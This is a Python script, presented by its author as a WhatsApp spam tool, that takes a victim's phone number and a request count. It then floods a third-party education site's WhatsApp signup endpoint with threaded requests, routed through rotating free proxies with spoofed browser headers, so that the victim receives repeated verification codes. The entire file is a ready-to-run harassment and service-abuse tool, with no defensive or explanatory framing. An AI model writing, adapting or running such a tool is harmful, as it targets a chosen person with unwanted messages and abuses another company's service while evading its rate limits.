import webbrowser
import requests
import sys
import threading
import json
import os
import random
from rich.panel import Panel
from rich.progress import Progress
from rich import print
from user_agent import generate_user_agent

# Constants
GOOD = 0
BAD = 0

# Open the web browser to the given URL

# Print information messages
print("""\033DEVELOPER : samialv
TELEGRAM  : @ethicalhacker_back
VERSION   : 1.0
PROJECT   : WHATSAPP SPAMMER
××××××××××××××××××××××××××××××××××××××××××××""")

# Get the phone number and limit from the user
NUM = input('<\\> Number  : ')
LIMIT = int(input('<\\> Limit (number of requests)  : '))

# Clear the screen (cross-platform)
os.system('cls' if os.name == 'nt' else 'clear')

# Print additional information
info_title = '[i][bold green] Spam Request Tool by samialv [/bold green][/i]'
info_message = (
    '[green]Instructions:[/green]\n'
    '- This tool sends spam requests to a specified number.\n'
    '- Ensure the number is a Bangladeshi number starting with +88.\n'
    '- If the tool encounters issues or the number gets stuck, retry the process.\n'
    '- Monitor the progress and check the result counts for success and failure rates.'
)
print(Panel(info_message, title=info_title))

# Function to perform the spam sending task
def AAA():
    global GOOD, BAD
    try:
        # Get a list of proxies
        prox = requests.get('https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies').text.split('\n')
        nip = random.choice(prox).strip()
        if not nip:
            raise ValueError('Proxy list is empty.')

        # Set up proxy
        proxs = {'http': 'socks4://' + nip}

        # Define the request URL and headers
        url = 'https://gw.abgateway.com/student/whatsapp/signup'
        headers = {
            'User-Agent': generate_user_agent(),
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'x-trace-id': 'guest_user:ec71bc1f-7bf7-490a-b0dc-dad31e7f31d7',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'access-control-allow-origin': '*',
            'platform': 'web',
            'sec-ch-ua-platform': '"Android"',
            'origin': 'https://abwaab.com',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://abwaab.com/',
            'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=1, i'
        }

        # Define the payload
        payload = json.dumps({
            'language': 'ar',
            'password': '12341ghf23',
            'phone': '+88' + NUM,
            'country': 'IQ',
            'country_code': '+88',
            'platform': 'web'
        })

        # Send the request
        response = requests.post(url, data=payload, headers=headers, proxies=proxs)
        response_text = response.text

        # Check the response and update counters
        if 'Whatsapp code is sent successfull' in response_text:
            GOOD += 1
        else:
            BAD += 1

        # Print the status
        sys.stdout.write(f'\r[\033[1;94m✦] \033[1;+88m[𝐍𝐎𝐓 𝐒𝐄𝐍𝐃] {BAD}|\033[95m[𝐒𝐏𝐀𝐌 𝐒𝐄𝐍𝐃][{GOOD}]')
        sys.stdout.flush()

    except Exception as e:
        BAD += 1
        sys.stdout.write(f'\r[\033[1;94m✦] \033[1;+88m[𝐍𝐎𝐓 𝐒𝐄𝐍𝐃] {BAD}|\033[95m[𝐒𝐏𝐀𝐌 𝐒𝐄𝐍𝐃][{GOOD}]')
        sys.stdout.flush()

# Create and start threads with a limit
Threads = []
with Progress() as progress:
    task = progress.add_task("[cyan]Sending Requests...", total=LIMIT)
    for t in range(LIMIT):
        x = threading.Thread(target=AAA)
        x.start()
        Threads.append(x)
        progress.update(task, advance=1)

# Wait for all threads to complete
for thread in Threads:
    thread.join()

print("\nProcess completed.")


#Whatsapp spam tool✅